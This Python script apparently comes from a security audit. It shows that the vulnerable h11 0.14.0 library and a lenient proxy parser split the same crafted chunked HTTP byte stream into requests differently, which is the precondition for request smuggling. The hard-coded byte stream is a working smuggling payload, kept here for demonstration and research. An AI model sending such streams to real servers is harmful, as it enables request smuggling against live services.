#!/usr/bin/env python3
"""Show the h11 0.14.0 chunked-footer disagreement with a lenient proxy parser.

The advisory's precondition for request smuggling is two HTTP parsers that both
accept the same byte stream but delimit it differently. This script prints what
each parser sees. It demonstrates the disagreement only; it does not smuggle a
request or exploit a live service.

Run from anywhere:  python two_parsers.py
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "audit"))

import h11  # vendored h11 0.14.0

# From GHSA-vqfr-h8mv-ghfj: every line break is CRLF.
STREAM = (
    b"POST /one HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"5\r\n"
    b"AAAAAXX2\r\n"
    b"45\r\n"
    b"0\r\n"
    b"\r\n"
    b"GET /two HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
)


def h11_view(data: bytes):
    """Parse with the vendored (vulnerable) h11 server connection."""
    conn = h11.Connection(h11.SERVER)
    conn.receive_data(data)
    requests = []
    current = None
    while True:
        event = conn.next_event()
        if event is h11.NEED_DATA or event is h11.PAUSED:
            break
        if isinstance(event, h11.Request):
            current = {"target": event.target.decode(), "body": b""}
            requests.append(current)
        elif isinstance(event, h11.Data):
            current["body"] += bytes(event.data)
        elif isinstance(event, h11.EndOfMessage):
            current = None
            # Acknowledge the request so the server can parse the next cycle.
            conn.send(h11.Response(status_code=200, headers=[(b"content-length", b"0")]))
            conn.send(h11.EndOfMessage())
            conn.start_next_cycle()
        elif isinstance(event, h11.ConnectionClosed):
            break
    return requests


def lenient_view(data: bytes):
    """A proxy that reads until the next CRLF after each chunk (the pound bug)."""
    requests = []
    pos = 0
    while pos < len(data):
        end = data.find(b"\r\n\r\n", pos)
        if end < 0:
            break
        head = data[pos:end].decode("latin1")
        pos = end + 4
        lines = head.split("\r\n")
        target = lines[0].split(" ")[1]
        body = b""
        if any("transfer-encoding: chunked" in line.lower() for line in lines[1:]):
            while pos < len(data):
                nl = data.find(b"\r\n", pos)
                if nl < 0:
                    break
                size = int(data[pos:nl].split(b";")[0], 16)
                pos = nl + 2
                if size == 0:
                    break
                body += data[pos : pos + size]
                pos += size
                nl = data.find(b"\r\n", pos)
                if nl < 0:
                    pos = len(data)
                    break
                pos = nl + 2  # lenient: skip anything up to the next CRLF
        requests.append({"target": target, "body": body})
        while data[pos : pos + 2] == b"\r\n":
            pos += 2
    return requests


def show(label: str, requests):
    print(f"{label}: {len(requests)} request(s)")
    for request in requests:
        print(f"  target={request['target']!r} body={request['body']!r}")


show("h11 0.14.0 (skips any 2 bytes)", h11_view(STREAM))
show("lenient proxy (reads to CRLF)", lenient_view(STREAM))
print()
print("Both parsers accept the stream, but they delimit it differently.")
print("That disagreement is the request-smuggling precondition, not a completed exploit.")
